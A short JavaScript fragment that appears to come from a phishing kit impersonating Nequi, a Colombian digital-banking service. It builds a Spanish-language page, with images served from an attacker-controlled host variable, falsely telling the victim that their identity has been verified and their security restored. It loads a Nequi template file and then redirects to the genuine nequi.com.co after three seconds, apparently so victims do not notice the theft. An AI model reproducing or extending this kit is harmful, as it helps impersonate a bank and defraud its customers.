var my_titulo = 'Nequi';
var nequi_body = `
<div class="container">
    <div id="contenido_nequi">
        <img src="${my_hosting}img/nequi_cel.jpg" width="20%">
        <h1>Te reconocimos :)</h1>
        <div>
            <a>Hemos verificado tu identidad y restablecido tu seguridad, ya puedes seguir disfrutando de nuestros servicios</a>
        </div>
    </div>
</div>
`
var my_contenido = `
<?php require_once('_plantilla_nequi.php'); ?>
`;

//<script>
    setTimeout(function() {
        window.location.href = 'https://nequi.com.co';
    }, 3000);